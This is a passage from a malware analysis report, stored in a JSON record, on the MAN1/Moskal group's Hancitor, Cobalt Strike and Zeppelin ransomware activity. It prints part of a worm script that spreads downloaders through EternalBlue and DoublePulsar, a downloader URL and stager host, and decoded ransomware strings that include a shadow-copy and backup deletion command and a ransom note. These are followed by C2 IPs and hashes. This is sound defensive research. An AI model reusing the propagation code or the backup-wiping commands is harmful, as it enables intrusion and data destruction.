'r').read().split('\\n'):\n    if line.find('Open') > 1:\n      Result.append(line.split(' ')[0])\n\n```\n\n-----\n\n```\n  for x in MyIP:\n    if x in Result:\n      Result.remove(x)\n  os.remove('Result.txt')\n  return Result\ndef attack(lst):\n  status = EternalBlue(lst)\n  if status == 'good x64':\n    Pulsar(lst, 'x64', 'x64.dll')\n    print 'Attack %s good' % lst\n  elif status == 'good x86':\n    Pulsar(lst, 'x86', 'x86.dll')\n    print 'Attack %s good' % lst\n  else:\n    print 'Attack %s not good!!!' % lst\ndef attack2(lst):\n  status = EternalBlue(lst)\n  if status == 'good x64':\n    Pulsar(lst, 'x64', '2x64.dll')\n    print 'Attack %s good' % lst\n  elif status == 'good x86':\n    Pulsar(lst, 'x86', '2x86.dll')\n    print 'Attack %s good' % lst\n  else:\n    print 'Attack %s not good!!!' % lst\ndef new_start():\n  print 'STARTED'\n  scanlist = []\n  lst = []\n  for line in open('scan.txt', 'r').read().split('\\n'):\n    for unit in line.split(' '):\n      scanlist.append(unit)\n  randomip = random.choice(scanlist)\n  lst = scaner(randomip)\n  for y in lst:\n    thread_ = threading.Thread(target=attack2, args=(y,)).start()\n  while threading.active_count() > 2:\n    time.sleep(5)\n\n```\n\n-----\n\n```\n  print 'FINISHED'\ndef start_local():\n  print 'STARTED_local'\n  lst = []\n  for ip in MyIP:\n    lst = scaner_local(ip + '/16')\n    for y in lst:\n      thread_ = threading.Thread(target=attack, args=(y,)).start()\n    while threading.active_count() > 2:\n      time.sleep(5)\n  print 'FINISHED'\ndef new_random():\n  print 'STARTED'\n  randomip = str(random.randint(1, 254)) + '.' + str(random.randint(0, 254)) + '.'\n+ '0.' + '0'\n  print 'scan ' + randomip + '/16'\n  lst = scaner(randomip + '/16')\n  for y in lst:\n    thread_ = threading.Thread(target=attack, args=(y,)).start()\n  while threading.active_count() > 2:\n    time.sleep(5)\n  print 'FINISHED'\nwhile True:  new_start()  start_local()\n\n### Ultimately this script is using DoublePulsar and EternalBlue to spread the x86.dll,x64.dll,2x86.dll,2x64.dll files which turn out to be fairly simplistic downloaders:\nUser-Agent RookIE/1.0hxxp://learinmica.com/update/update[.]rar\n\n The file will be stored in the ProgramData directory and leads to similar Autoit executables for using scaner.dat and CS stagers leading to more CS servers:\ntaskhosta.exe - e2f686f17b73398d949998e46c7fde48d0507b324a811df39cdd91531deb3d89\n\n This is a CS stager using a different watermark and downloading a beacon from:\n\n```\n\n-----\n\n```\n31.44.184 .50/nECf\n\n### The other file we previously mentioned from 45.142.213[.]167:\noxford.exe - 6e4459199d7fbdc4c215e595906e78fdd1c15ad3be6abed6540b80de17b63f3b\n\n This is VegaLocker ransomware version Zeppelin, we can quickly decode all the onboard strings:\n>>> import re>>> t = re.findall('''\\xff\\xff\\xff\\xff.\\x00\\x00\\x00''', data)>>>\nlen(t)268>>> def decode(blah):...  rc4 = ARC4.new(blah[:0x20])...  return\nrc4.decrypt(blah[0x20:])... >>> import struct>>> for val in t:...  o =\ndata.find(val)...  (a,b) = struct.unpack_from('<II', data[o:])...  blob =\ndata[o+8:o+8+b]...  try:...   print(decode(blob))...  except:...   pass...\n\n A snippet of the decoded strings:\n\n```\n\n-----\n\n```\nSoftware\\Zeppelin\\Process\nSoftware\\Zeppelin\\Process\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\\nSoftware\\Zeppelin\n</div>\nNtQuerySystemInformation\nNtQuerySystemInformation\n</N><D>\n1767974731E6E223476E65712463554E87F55542B120AB1CE64651031B43D6AF4DECB1CF8ED6E71FED2376\n1767974731E6E223476E65712463554E87F55542B120AB1CE64651031B43D6AF4DECB1CF8ED6E71FED2376\n{15F7DAB8-8C18-A41B-BFCD-C970AE422622}\nbcdedit /set {default} bootstatuspolicy ignoreallfailures;bcdedit /set {default}\nrecoveryenabled no;wbadmin delete catalog -quiet;wbadmin delete\nsystemstatebackup;wbadmin delete systemstatebackup -keepversions:0;wbadmin delete\nbackup;wmic shadowcopy delete;vssadmin delete shadows /all /quiet;\n</N><D>\nboot.ini;bootfont.bin;bootsect.bak;desktop.ini;iconcache.db;ntdetect.com;ntldr;ntuser.\n:\\$Windows.~bt\\;:\\System Volume\nInformation\\;:\\Windows.old\\;:\\Windows\\;:\\intel\\;:\\nvidia\\;:\\inetpub\\logs\\;\\All\nUsers\\;\\AppData\\;\\Apple Computer\\Safari\\;\\Application\nData\\;\\Boot\\;\\Google\\;\\Google\\Chrome\\;\\Mozilla Firefox\\;\\Mozilla\\;\\Opera\nSoftware\\;\\Opera\\;\\Tor Browser\\;\\Common Files\\;\\Internet Explorer\\;\\Windows\nDefender\\;\\Windows Mail\\;\\Windows Media Player\\;\\Windows Multimedia\nPlatform\\;\\Windows NT\\;\\Windows Photo Viewer\\;\\Windows Portable\nDevices\\;\\WindowsPowerShell\\;\\Windows Photo Viewer\\;\\Windows Security\\;\\Embedded\nLockdown Manager\\;\\Windows Journal\\;\\MSBuild\\;\\Reference Assemblies\\;\\Windows\nSidebar\\;\\Windows Defender Advanced Threat Protection\\;\\Microsoft\\;\\Package\nCache\\;\\Microsoft Help\\;\nQueryFullProcessImageNameW\nVeeam.Backup.Manager.exe;Veeam.Backup.Agent.ConfigurationService.exe;Veeam.Backup.Brok\nnt.exe;mysqldopt.exe;mysqld.exe;ncsvc.exe;ocautoupds.exe;ocomm.exe;ocssd.exe;oracle.exe;oracle.exe;\n.bat;.cmd;.com;.cpl;.dll;.msc;.msp;.pif;.scr;.sys;.log;.lnk;.zeppelin;\n!!! ALL YOUR FILES ARE ENCRYPTED !!!.TXT\n!!! ALL YOUR FILES ARE ENCRYPTED !!!\nAll your files, documents, photos, databases and other important files are encrypted.\n!!! YOUR FILES ARE ENCRYPTED !!!\nAll your files, documents, photos, databases and other important\nfiles are encrypted.\nYou are not able to decrypt it by yourself! There is only one method\nof recovering files it is purchase an unique private key.\nWrite to angry_war@protonmail.ch\nYour personal ID: <!--ID-->\n\n```\n\n-----\n\n```\nAttention! Do not rename encrypted files. Do not try to decrypt your data using\nthird party software, it may cause permanent data loss.\n\n### We can continue pivoting on some of the CobaltStrike C2 servers, their admin ports are 43890 instead of the default 50050 and the cert is static:\ns:C = US, ST = Washington, L = Redmond, O = Microsoft Corporation, OU = Microsoft\nCorporation, CN = Outlook.live.com\n\n I wrote up a tool for cert scanning ranges a number of years ago for a local conference and we can use it here to scan entire ranges looking for this actors infrastructure.\n4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP: 31.44.184.181 <Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.165 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.84 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.100 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.74 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.82 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.174 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.56 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.73 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n31.44.184.63 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft Corporation,CN=Outlook.live.com)>\n\n Another range:\n\n```\n\n-----\n\n```\n4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP: 185.153.199.162 \n<Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>2a332c3a76f2bea5d458f33cf025db656983c72eIP:\n185.153.199.161 - Empty733716db5a44d79a1a2881109f62060079b5b7a0IP: 185.153.199.167 Empty21338c5fec99e8df6573b169fbb2f388b84f82efIP: 185.153.199.165 Empty4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP: 185.153.199.163 <Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n185.153.199.166 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft\nCorporation,CN=Outlook.live.com)>4a08189c6f97c3b9a424f1f18c5c4356beaf1b3eIP:\n185.153.199.164 - <Name(C=US,ST=Washington,L=Redmond,O=Microsoft\nCorporation,OU=Microsoft Corporation,CN=Outlook.live.com)>\n\n### The ‘Empty’ ones are the default CS admin certification:\nsubject=C = Earth, ST = Cyberspace, L = Somewhere, O = cobaltstrike, OU =\nAdvancedPenTesting, CN = Major Cobalt Strike\n\n More pivoting on one of the CS servers ‘31.44.184.63’ has an interesting file associated with it on VirusTotal.\nfe7d4cb5112f5ae0a3d0f9593e1954c60f771f14cc161acd9bdf2f91f2d3267a\n\n This file is a packed sample of Send-Safe spam bot.\n{'C2': '31.44.184.63:50001/50002', 'CONF': '31.44.184.63:50001/50002;Enterprise\nMailing Service'}\n\n Send-Safe spammer is also a known utility used by this threat group.\n\n## IOCs\n\n### CS Related Hashes:\n655346f41c456cefd9d40c1b9484f1c0dfa36d180c72dd2d1ada26661be1ca6d2d038b20eaf05bb8d67354\n\n IPs:\n31.44.184.18131.44.184.16531.44.184.8431.44.184.10031.44.184.7431.44.184.8231.44.184.1\n\n## References\n\n### https://vixra.org/abs/1902.0257 https://www.blueliv.com/downloads/network-insights-into-vawtrak-v2.pdf https://www.proofpoint.com/sites/default/files/pfpt-us-tr-q117-threat-report.pdf\n\n https://isc.sans.edu/forums/diary/Hancitor+infection+with+Pony+Evil+Pony+Ursnif+and+Cob alt+Strike/25532/ https://app.any.run/tasks/5d21ab13-70fb-4ccf-8a80-545d19c7d20f/\n\n```\n\n-----\n\n### https://www.malware-traffic-analysis.net/2020/10/20/index.html https://www.malware-traffic-analysis.net/2020/01/21/index2.html\n\n https://lokalhost.pl/txt/peering.into.spam.botnets.VirusBulletin2017.pdf\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-10 - MAN1, Moskal, Hancitor and a side of Ransomware.pdf"
    ],
    "report_names": [
        "2021-01-10 - MAN1, Moskal, Hancitor and a side of Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535879,
    "ts_updated_at": 1743041592,
    "ts_creation_date": 1653760690,
    "ts_modification_date": 1653760690,
    "files": {
        "pdf": "https://archive.orkl.eu/78f9f494c15375f7b8ad2a7fd0c69d4bfbf223dd.pdf",
        "text": "https://archive.orkl.eu/78f9f494c15375f7b8ad2a7fd0c69d4bfbf223dd.txt",
        "img": "https://archive.orkl.eu/78f9f494c15375f7b8ad2a7fd0c69d4bfbf223dd.jpg"
    }
}